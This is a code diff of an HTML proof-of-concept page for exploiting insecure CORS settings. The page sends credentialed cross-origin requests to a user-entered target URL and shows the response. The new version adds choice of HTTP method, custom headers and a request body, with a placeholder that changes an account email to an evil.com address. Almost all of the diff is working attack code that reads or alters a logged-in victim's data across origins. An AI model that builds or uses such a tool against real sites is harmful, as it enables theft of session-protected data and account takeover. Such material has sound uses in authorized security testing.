@@ -89,48 +89,75 @@
   </style>
 </head>
 <body>
-  <header>
-    <h1>⚠️ CORS Exploit Portal</h1>
-  </header>
+  <h2>CORS Exploit PoC</h2>
 
-  <div class="container">
-    <h2>Test for Insecure CORS</h2>
-    <p>Enter the target vulnerable URL (e.g. <code>https://target.com/api/user</code>)</p>
-    <input type="text" id="targetURL" placeholder="https://target.com/api/user" />
-    <button onclick="exploitCORS()">Fetch Sensitive Data</button>
-    <textarea id="fetchedResource" placeholder="Response will appear here..."></textarea>
-  </div>
+  <label>Target URL:</label><br>
+  <input type="text" id="targetURL" placeholder="https://victim.com/api/user"><br><br>
 
-  <footer>
-    <p>Created by <a href="https://github.com/Milan-Gautam" target="_blank" rel="noopener noreferrer">Milan Gautam</a> | For Educational Use Only</p>
-  </footer>
+  <label>HTTP Method:</label><br>
+  <select id="httpMethod">
+    <option>GET</option>
+    <option>POST</option>
+    <option>PUT</option>
+    <option>DELETE</option>
+  </select><br><br>
+
+  <label>Custom Headers (key:value per line):</label><br>
+  <textarea id="customHeaders" rows="4" cols="50" placeholder="Authorization: Bearer xxxxx"></textarea><br><br>
+
+  <label>Request Body (for POST/PUT):</label><br>
+  <textarea id="requestBody" rows="6" cols="50" placeholder='{"email":"test@evil.com"}'></textarea><br><br>
+
+  <button onclick="exploitCORS()">Send Request</button>
+
+  <h3>Response:</h3>
+  <textarea id="fetchedResource" rows="15" cols="80"></textarea>
 
   <script>
     function exploitCORS() {
-      const url = document.getElementById("targetURL").value.trim();
-      const output = document.getElementById("fetchedResource");
+      var targetUrl = document.getElementById("targetURL").value;
+      var method = document.getElementById("httpMethod").value;
+      var headersText = document.getElementById("customHeaders").value;
+      var body = document.getElementById("requestBody").value;
 
-      if (!url || !url.startsWith("http")) {
-        alert("Please enter a valid target URL starting with http or https");
+      if (!targetUrl) {
+        alert("Please enter a valid target URL!");
         return;
       }
 
-      output.value = "⏳ Sending request to: " + url;
+      document.getElementById("fetchedResource").value = "";
 
-      fetch(url, {
-        method: "GET",
-        credentials: "include" // Send cookies!
-      })
-      .then(response => {
-        if (!response.ok) throw new Error("❌ HTTP error: " + response.status);
-        return response.text();
-      })
-      .then(data => {
-        output.value = "✅ Exploit Successful!\n\n" + data;
-      })
-      .catch(error => {
-        output.value = "❌ Exploit Failed:\n" + error;
-      });
+      var req = new XMLHttpRequest();
+      req.open(method, targetUrl, true);
+      req.withCredentials = true;
+
+      // Set custom headers
+      if (headersText) {
+        headersText.split('\n').forEach(line => {
+          const [key, value] = line.split(':').map(x => x.trim());
+          if (key && value) {
+            req.setRequestHeader(key, value);
+          }
+        });
+      }
+
+      req.onload = function () {
+        document.getElementById("fetchedResource").value = this.responseText || "No response received.";
+        if (!this.responseText) {
+          alert("No response received. The target may not be vulnerable or no data was returned.");
+        }
+      };
+
+      req.onerror = function () {
+        alert("Request failed. The target might be blocking CORS or not responding.");
+      };
+
+      if (method === "POST" || method === "PUT") {
+        req.setRequestHeader("Content-Type", "application/json");
+        req.send(body || null);
+      } else {
+        req.send();
+      }
     }
   </script>
 </body>
